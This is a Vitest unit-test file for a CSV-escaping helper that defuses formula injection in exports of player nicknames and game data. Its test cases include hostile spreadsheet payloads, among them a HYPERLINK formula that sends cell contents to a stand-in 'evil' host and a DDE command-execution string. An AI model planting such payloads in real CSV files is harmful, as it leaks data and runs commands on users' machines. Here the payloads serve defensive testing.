import { describe, expect, it } from 'vitest';
import { csvCell } from '../src/lib/csv.js';

/**
 * Audit #137 — CSV exports carry player-chosen text (nicknames, kits,
 * weapons). A cell starting with `=`, `+`, `-`, `@`, tab or CR is evaluated
 * as a formula by Excel/LibreOffice, so it is defused with a leading
 * apostrophe and quoted (OWASP "CSV Injection").
 */
describe('csvCell', () => {
  it.each([
    ['=HYPERLINK("http://evil/?"&A1,"x")', `"'=HYPERLINK(""http://evil/?""&A1,""x"")"`],
    ["+cmd|'/c calc'!A0", `"'+cmd|'/c calc'!A0"`],
    ['-2+3', `"'-2+3"`],
    ['@SUM(A1:A9)', `"'@SUM(A1:A9)"`],
    ['\t=1+1', `"'\t=1+1"`],
    ['\r=1+1', `"'\r=1+1"`],
  ])('defuses the formula %j', (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it.each([
    ['-12.5', '-12.5'],
    ['+7', '+7'],
    ['-1e3', '-1e3'],
  ])('leaves the numeric text %j intact', (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it('never prefixes typed numbers and booleans', () => {
    expect(csvCell(-5)).toBe('-5');
    expect(csvCell(false)).toBe('false');
  });

  it('quotes separators, quotes and line breaks (RFC 4180)', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('a;b')).toBe('"a;b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
  });

  it('writes plain text as is and null as an empty cell', () => {
    expect(csvCell('SniperWolf')).toBe('SniperWolf');
    expect(csvCell(null)).toBe('');
  });
});
